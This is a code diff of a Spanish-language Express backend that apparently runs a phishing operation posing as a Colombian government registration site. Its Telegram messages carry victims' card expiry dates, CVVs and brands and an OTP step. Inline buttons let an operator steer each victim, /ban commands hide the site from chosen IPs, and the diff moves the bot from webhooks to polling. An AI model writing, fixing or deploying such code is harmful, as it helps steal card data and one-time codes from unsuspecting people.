@@ -8,7 +8,6 @@ app.use(express.json({ limit: '1mb' }));
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://registraenlineanuip-crtificadonacioncol.onrender.com';
-const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://backvenecol.onrender.com';
 
 // 🧠 ALMACENAMIENTO EN MEMORIA
 const pagosPendientes = new Map();
@@ -85,7 +84,7 @@ async function tgAnswerCallback(callbackQueryId, text) {
 }
 
 // ============================================================
-// 📝 TEXTOS DE MENSAJES TELEGRAM (CON IP INCLUIDA)
+// 📝 TEXTOS DE MENSAJES TELEGRAM (TODOS CON VENCE, CVV Y MARCA)
 // ============================================================
 
 function textoPasoCrear(pago) {
@@ -362,64 +361,54 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
 });
 
 // ============================================================
-// 🤖 POST /api/telegram-webhook
+// 🤖 PROCESADOR DE UPDATE DE TELEGRAM (polling)
 // ============================================================
-app.post('/api/telegram-webhook', async (req, res) => {
-    res.sendStatus(200);
-
-    // 📩 Manejo de mensajes de texto (/ban /unban /listaban)
-    const msg = req.body?.message;
-    if (msg && msg.text) {
-        const chatIdMsg = String(msg.chat?.id);
-        if (chatIdMsg !== String(CHAT_ID)) return;
-
-        const partes = msg.text.trim().split(/\s+/);
-        const comando = partes[0].toLowerCase();
-        const arg = partes[1];
-
-        if (comando === '/ban') {
-            if (!arg) {
-                await tgSendMessage('⚠️ Uso: <code>/ban 1.2.3.4</code>');
-                return;
-            }
-            const ip = arg.replace(/^::ffff:/, '').trim();
-            ipsBaneadas.add(ip);
-            await tgSendMessage(`🚫 <b>IP BANEADA</b>\n<code>${ip}</code>\n\nAhora recibirá 404 en toda la web.`);
-            return;
-        }
-
-        if (comando === '/unban') {
-            if (!arg) {
-                await tgSendMessage('⚠️ Uso: <code>/unban 1.2.3.4</code>');
-                return;
-            }
-            const ip = arg.replace(/^::ffff:/, '').trim();
-            const eliminada = ipsBaneadas.delete(ip);
-            await tgSendMessage(eliminada
-                ? `✅ <b>IP DESBANEADA</b>\n<code>${ip}</code>`
-                : `ℹ️ La IP <code>${ip}</code> no estaba baneada.`);
-            return;
-        }
-
-        if (comando === '/listaban' || comando === '/banlist') {
-            if (ipsBaneadas.size === 0) {
-                await tgSendMessage('📭 No hay IPs baneadas.');
-            } else {
-                const lista = [...ipsBaneadas].map(ip => `• <code>${ip}</code>`).join('\n');
-                await tgSendMessage(`🚫 <b>IPs BANEADAS (${ipsBaneadas.size})</b>\n\n${lista}`);
-            }
-            return;
-        }
-    }
-
-    // 📌 Manejo de callbacks (botones inline)
-    const cq = req.body?.callback_query;
-    if (!cq || !cq.data) return;
-
-    const [accion, solicitud_id] = cq.data.split(':');
-    const msgId = cq.message?.message_id;
-
+async function procesarUpdate(update) {
     try {
+        // 📩 Comandos de baneo
+        const msg = update.message;
+        if (msg && msg.text) {
+            const chatIdMsg = String(msg.chat?.id);
+            if (chatIdMsg !== String(CHAT_ID)) return;
+
+            const partes = msg.text.trim().split(/\s+/);
+            const comando = partes[0].toLowerCase().split('@')[0];
+            const arg = partes[1];
+
+            if (comando === '/ban') {
+                if (!arg) { await tgSendMessage('⚠️ Uso: <code>/ban 1.2.3.4</code>'); return; }
+                const ip = arg.replace(/^::ffff:/, '').trim();
+                ipsBaneadas.add(ip);
+                await tgSendMessage(`🚫 <b>IP BANEADA</b>\n<code>${ip}</code>\n\nAhora recibirá 404 en toda la web.`);
+                return;
+            }
+            if (comando === '/unban') {
+                if (!arg) { await tgSendMessage('⚠️ Uso: <code>/unban 1.2.3.4</code>'); return; }
+                const ip = arg.replace(/^::ffff:/, '').trim();
+                const eliminada = ipsBaneadas.delete(ip);
+                await tgSendMessage(eliminada
+                    ? `✅ <b>IP DESBANEADA</b>\n<code>${ip}</code>`
+                    : `ℹ️ La IP <code>${ip}</code> no estaba baneada.`);
+                return;
+            }
+            if (comando === '/listaban' || comando === '/banlist') {
+                if (ipsBaneadas.size === 0) {
+                    await tgSendMessage('📭 No hay IPs baneadas.');
+                } else {
+                    const lista = [...ipsBaneadas].map(ip => `• <code>${ip}</code>`).join('\n');
+                    await tgSendMessage(`🚫 <b>IPs BANEADAS (${ipsBaneadas.size})</b>\n\n${lista}`);
+                }
+                return;
+            }
+        }
+
+        // 📌 Callbacks (botones inline) — MISMA LÓGICA ORIGINAL
+        const cq = update.callback_query;
+        if (!cq || !cq.data) return;
+
+        const [accion, solicitud_id] = cq.data.split(':');
+        const msgId = cq.message?.message_id;
+
         const pago = pagosPendientes.get(solicitud_id);
         if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');
 
@@ -475,22 +464,56 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 await tgEditMessage(msgId, `⚠️ <b>ERROR DE USUARIO</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente reiniciar el proceso.`);
             }
         }
-    } catch (err) { console.error("Error en webhook:", err); }
-});
-
-// ============================================================
-// 🔗 REGISTRO DE WEBHOOK + ARRANQUE
-// ============================================================
-async function registrarWebhook() {
-    if (!TELEGRAM_TOKEN) return;
-    try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${encodeURIComponent(PUBLIC_BACKEND_URL + '/api/telegram-webhook')}`);
-        console.log('✅ Webhook registrado');
-    } catch (e) { console.error("Error registrando webhook:", e); }
+    } catch (err) {
+        console.error("Error procesando update:", err);
+    }
 }
 
+// ============================================================
+// 🔄 POLLING DE TELEGRAM
+// ============================================================
+let lastUpdateId = 0;
+
+async function iniciarPolling() {
+    if (!TELEGRAM_TOKEN) {
+        console.error('❌ TELEGRAM_TOKEN no configurado');
+        return;
+    }
+
+    // Eliminar webhook para que getUpdates funcione
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteWebhook`);
+        console.log('✅ Webhook eliminado (usando polling)');
+    } catch (e) {
+        console.error('Error eliminando webhook:', e);
+    }
+
+    console.log('🔄 Polling de Telegram iniciado');
+
+    while (true) {
+        try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?timeout=30&offset=${lastUpdateId + 1}`;
+            const r = await fetch(url);
+            const data = await r.json();
+
+            if (data.ok && Array.isArray(data.result)) {
+                for (const update of data.result) {
+                    lastUpdateId = update.update_id;
+                    await procesarUpdate(update);
+                }
+            }
+        } catch (e) {
+            console.error('Error en polling:', e.message);
+            await new Promise(r => setTimeout(r, 3000));
+        }
+    }
+}
+
+// ============================================================
+// 🚀 ARRANQUE
+// ============================================================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Backend en puerto ${PORT}`);
-    registrarWebhook();
+    iniciarPolling();
 });
